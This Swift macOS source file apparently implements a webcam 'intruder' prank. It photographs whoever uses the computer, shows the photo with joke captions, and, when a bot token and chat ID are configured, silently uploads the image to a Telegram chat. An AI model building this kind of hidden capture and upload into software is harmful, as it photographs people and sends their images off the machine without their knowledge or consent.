// Copyright (c) 2026 SlashGordon
// Author: SlashGordon <slash.gordon.dev@gmail.com>


import AppKit
import AVFoundation

/// Captures a webcam photo and displays it on the overlay with a funny caption.
/// Has a cooldown to avoid spamming captures on every interaction.
class WebcamPrankManager: NSObject, AVCapturePhotoCaptureDelegate {


    private var captureSession: AVCaptureSession?
    private var photoOutput: AVCapturePhotoOutput?
    private var isCoolingDown = false
    private var isCapturing = false
    private let cooldownSeconds: TimeInterval
    private var telegramBotToken: String?
    private var telegramChatId: String?


    /// Currently displayed prank views, keyed by overlay window.
    private var activeViews: [NSWindow: NSView] = [:]

    /// Callback set during capture; receives the taken image.
    private var captureCompletion: ((NSImage?) -> Void)?

    private static let funnyTexts = [
        "🚨 INTRUDER ALERT 🚨",
        "Smile! You're on candid camera! 📸",
        "CAUGHT IN 4K 📷",
        "This face was caught touching someone else's computer",
        "WANTED: For unauthorized computer access 🕵️",
        "Your face has been reported to HR 😬",
        "Nice try, buddy! 📸",
        "SAY CHEESE! 🧀",
        "Security breach detected! Face logged 🔒",
        "Mom would be so disappointed 😢",
        "This photo will be sent to your contacts in 10 seconds... just kidding 😈",
        "FBI OPEN UP 🚔",
        "Achievement unlocked: Got caught! 🏆",
        "You looked better from the other side of the screen 🪞",
    ]

    init(cooldownSeconds: TimeInterval = 5.0, telegramBotToken: String? = nil, telegramChatID: String? = nil) {
        self.cooldownSeconds = cooldownSeconds
        self.telegramBotToken = telegramBotToken
        self.telegramChatId = telegramChatID
        super.init()
        setupCaptureSession()
    }

    // MARK: - Setup

    private func setupCaptureSession() {
        let session = AVCaptureSession()
        session.sessionPreset = .medium

        guard let camera = AVCaptureDevice.default(for: .video),
              let input = try? AVCaptureDeviceInput(device: camera) else {
            NSLog("[WebcamPrank] No camera found or access denied")
            return
        }

        guard session.canAddInput(input) else { return }
        session.addInput(input)

        let output = AVCapturePhotoOutput()
        guard session.canAddOutput(output) else { return }
        session.addOutput(output)

        captureSession = session
        photoOutput = output

        // Start session on background thread
        DispatchQueue.global(qos: .userInitiated).async {
            session.startRunning()
        }

        NSLog("[WebcamPrank] Camera capture session initialized")
    }

    // MARK: - Public API

    /// Captures a webcam photo and displays it on the given overlay windows.
    func triggerPrank(on overlays: [(screen: NSScreen, window: NSWindow)]) {
        guard !isCoolingDown, !isCapturing else { return }
        guard captureSession?.isRunning == true else {
            NSLog("[WebcamPrank] Capture session not running, cannot take photo")
            return
        }

        isCapturing = true

        captureCompletion = { [weak self] image in
            guard let self = self else { return }
            self.isCapturing = false

            // Trigger the Telegram upload if we successfully captured an image
            if let capturedImage = image {
                self.sendToTelegram(image: capturedImage)
            }

            DispatchQueue.main.async {
                let text = WebcamPrankManager.funnyTexts.randomElement() ?? "CAUGHT! 📸"
                for entry in overlays {
                    self.displayPrank(image: image, text: text, in: entry.window)
                }
                self.startCooldown()
            }
        }

        let settings = AVCapturePhotoSettings()
        photoOutput?.capturePhoto(with: settings, delegate: self)
    }

    /// Removes all displayed prank views.
    func dismissAll() {
        for (_, view) in activeViews {
            view.removeFromSuperview()
        }
        activeViews.removeAll()
    }

    /// Stops the capture session.
    func stop() {
        dismissAll()
        captureSession?.stopRunning()
    }

    // MARK: - AVCapturePhotoCaptureDelegate

    func photoOutput(_ output: AVCapturePhotoOutput,
                     didFinishProcessingPhoto photo: AVCapturePhoto,
                     error: Error?) {
        guard let data = photo.fileDataRepresentation(),
              let image = NSImage(data: data) else {
            NSLog("[WebcamPrank] Failed to process captured photo")
            captureCompletion?(nil)
            captureCompletion = nil
            return
        }
        captureCompletion?(image)
        captureCompletion = nil
    }

    // MARK: - Display

    private func displayPrank(image: NSImage?, text: String, in window: NSWindow) {
        // Remove previous prank view on this window
        activeViews[window]?.removeFromSuperview()

        guard let contentView = window.contentView else { return }

        let prankView = WebcamPrankView(image: image, text: text)
        let prankSize = NSSize(width: 420, height: 440)
        let origin = NSPoint(
            x: (contentView.bounds.width - prankSize.width) / 2,
            y: (contentView.bounds.height - prankSize.height) / 2
        )
        prankView.frame = NSRect(origin: origin, size: prankSize)
        contentView.addSubview(prankView)

        activeViews[window] = prankView

        // Auto-dismiss after 8 seconds
        DispatchQueue.main.asyncAfter(deadline: .now() + 8.0) { [weak self] in
            guard let self = self, self.activeViews[window] === prankView else { return }
            prankView.removeFromSuperview()
            self.activeViews.removeValue(forKey: window)
        }
    }

    // MARK: - Cooldown

    private func startCooldown() {
        isCoolingDown = true
        DispatchQueue.main.asyncAfter(deadline: .now() + cooldownSeconds) { [weak self] in
            self?.isCoolingDown = false
        }
    }

    // MARK: - Telegram Integration

    /// Sends the captured image to a specific Telegram chat using a bot token.
    private func sendToTelegram(image: NSImage) {
        guard let botToken = telegramBotToken, let chatId = telegramChatId else {
            NSLog("[WebcamPrank] Telegram credentials not configured.")
            return
        }

        let cleanToken = botToken.trimmingCharacters(in: .whitespacesAndNewlines)
        let cleanChatId = chatId.trimmingCharacters(in: .whitespacesAndNewlines)

        guard let cgImage = image.cgImage(forProposedRect: nil, context: nil, hints: nil),
              let jpegData = NSBitmapImageRep(cgImage: cgImage).representation(using: .jpeg, properties: [.compressionFactor: 0.8]) else {
            return
        }

        // 1. Here is your simplified endpoint URL
        let urlString = "https://api.telegram.org/bot\(cleanToken)/sendPhoto"
        guard let url = URL(string: urlString) else { return }

        var request = URLRequest(url: url)
        request.httpMethod = "POST"
        
        let boundary = "Boundary-\(UUID().uuidString)"
        request.setValue("multipart/form-data; boundary=\(boundary)", forHTTPHeaderField: "Content-Type")

        // 2. We keep the main function clean by using a helper to package the form data
        let bodyData = createMultipartBody(boundary: boundary, chatId: cleanChatId, imageData: jpegData)
        request.setValue("\(bodyData.count)", forHTTPHeaderField: "Content-Length")

        // 3. Simple and clean upload task
        let task = URLSession.shared.uploadTask(with: request, from: bodyData) { data, response, error in
            if let httpResponse = response as? HTTPURLResponse, httpResponse.statusCode == 200 {
                NSLog("[WebcamPrank] Successfully dispatched photo.")
            } else {
                NSLog("[WebcamPrank] Server rejected the request.")
            }
        }
        task.resume()
    }

    // MARK: - Networking Helpers

    /// Wraps the chat ID and image data into a single multipart payload
    private func createMultipartBody(boundary: String, chatId: String, imageData: Data) -> Data {
        var body = Data()
        
        // Append chat_id
        body.append(contentsOf: "--\(boundary)\r\n".utf8)
        body.append(contentsOf: "Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n".utf8)
        body.append(contentsOf: "\(chatId)\r\n".utf8)
        
        // Append photo
        body.append(contentsOf: "--\(boundary)\r\n".utf8)
        body.append(contentsOf: "Content-Disposition: form-data; name=\"photo\"; filename=\"intruder.jpg\"\r\n".utf8)
        body.append(contentsOf: "Content-Type: image/jpeg\r\n\r\n".utf8)
        body.append(imageData)
        body.append(contentsOf: "\r\n--\(boundary)--\r\n".utf8)
        
        return body
    }
}
// MARK: - WebcamPrankView

/// A view that shows a captured webcam photo with a funny caption underneath.
class WebcamPrankView: NSView {

    init(image: NSImage?, text: String) {
        super.init(frame: .zero)
        wantsLayer = true

        // Background
        let gradientLayer = CAGradientLayer()
        gradientLayer.colors = [
            NSColor(red: 0.10, green: 0.10, blue: 0.15, alpha: 0.95).cgColor,
            NSColor(red: 0.06, green: 0.06, blue: 0.10, alpha: 0.98).cgColor,
        ]
        gradientLayer.cornerRadius = 20
        layer?.addSublayer(gradientLayer)

        layer?.cornerRadius = 20
        layer?.borderWidth = 2.0
        layer?.borderColor = NSColor(red: 1.0, green: 0.3, blue: 0.3, alpha: 0.7).cgColor
        layer?.shadowColor = NSColor(red: 1.0, green: 0.2, blue: 0.2, alpha: 0.8).cgColor
        layer?.shadowRadius = 30
        layer?.shadowOpacity = 0.7
        layer?.shadowOffset = .zero
        layer?.masksToBounds = false

        // Camera emoji header
        let headerLabel = NSTextField(labelWithString: "📸 BUSTED! 📸")
        headerLabel.font = NSFont.systemFont(ofSize: 20, weight: .heavy)
        headerLabel.textColor = NSColor(red: 1.0, green: 0.3, blue: 0.3, alpha: 1.0)
        headerLabel.alignment = .center
        headerLabel.translatesAutoresizingMaskIntoConstraints = false
        addSubview(headerLabel)

        // Photo view
        let imageView = NSImageView()
        imageView.translatesAutoresizingMaskIntoConstraints = false
        imageView.imageScaling = .scaleProportionallyUpOrDown
        imageView.wantsLayer = true
        imageView.layer?.cornerRadius = 12
        imageView.layer?.masksToBounds = true
        imageView.layer?.borderWidth = 2.0
        imageView.layer?.borderColor = NSColor.white.withAlphaComponent(0.2).cgColor

        if let image = image {
            // Mirror the image horizontally so it looks like a selfie
            let mirrored = NSImage(size: image.size)
            mirrored.lockFocus()
            let transform = NSAffineTransform()
            transform.translateX(by: image.size.width, yBy: 0)
            transform.scaleX(by: -1, yBy: 1)
            transform.concat()
            image.draw(in: NSRect(origin: .zero, size: image.size))
            mirrored.unlockFocus()
            imageView.image = mirrored
        } else {
            // No camera? Show placeholder
            let placeholder = NSImage(size: NSSize(width: 300, height: 200))
            placeholder.lockFocus()
            NSColor.darkGray.setFill()
            NSBezierPath.fill(NSRect(origin: .zero, size: placeholder.size))
            let attrs: [NSAttributedString.Key: Any] = [
                .font: NSFont.systemFont(ofSize: 40),
                .foregroundColor: NSColor.white
            ]
            let str = "🚫📷" as NSString
            let strSize = str.size(withAttributes: attrs)
            str.draw(at: NSPoint(
                x: (300 - strSize.width) / 2,
                y: (200 - strSize.height) / 2
            ), withAttributes: attrs)
            placeholder.unlockFocus()
            imageView.image = placeholder
        }
        addSubview(imageView)

        // Funny text label
        let captionLabel = NSTextField(labelWithString: text)
        captionLabel.font = NSFont.systemFont(ofSize: 16, weight: .bold)
        captionLabel.textColor = .white
        captionLabel.alignment = .center
        captionLabel.lineBreakMode = .byWordWrapping
        captionLabel.maximumNumberOfLines = 2
        captionLabel.translatesAutoresizingMaskIntoConstraints = false
        captionLabel.shadow = {
            let s = NSShadow()
            s.shadowColor = NSColor.black.withAlphaComponent(0.6)
            s.shadowBlurRadius = 6
            s.shadowOffset = NSSize(width: 0, height: -1)
            return s
        }()
        addSubview(captionLabel)

        NSLayoutConstraint.activate([
            headerLabel.topAnchor.constraint(equalTo: topAnchor, constant: 20),
            headerLabel.centerXAnchor.constraint(equalTo: centerXAnchor),

            imageView.topAnchor.constraint(equalTo: headerLabel.bottomAnchor, constant: 16),
            imageView.centerXAnchor.constraint(equalTo: centerXAnchor),
            imageView.widthAnchor.constraint(equalToConstant: 320),
            imageView.heightAnchor.constraint(equalToConstant: 240),

            captionLabel.topAnchor.constraint(equalTo: imageView.bottomAnchor, constant: 16),
            captionLabel.leadingAnchor.constraint(equalTo: leadingAnchor, constant: 20),
            captionLabel.trailingAnchor.constraint(equalTo: trailingAnchor, constant: -20),
            captionLabel.bottomAnchor.constraint(lessThanOrEqualTo: bottomAnchor, constant: -20),
        ])
    }

    override func layout() {
        super.layout()
        if let gradient = layer?.sublayers?.first(where: { $0 is CAGradientLayer }) {
            gradient.frame = bounds
        }
    }

    @available(*, unavailable)
    required init?(coder: NSCoder) {
        fatalError("init(coder:) has not been implemented")
    }
}
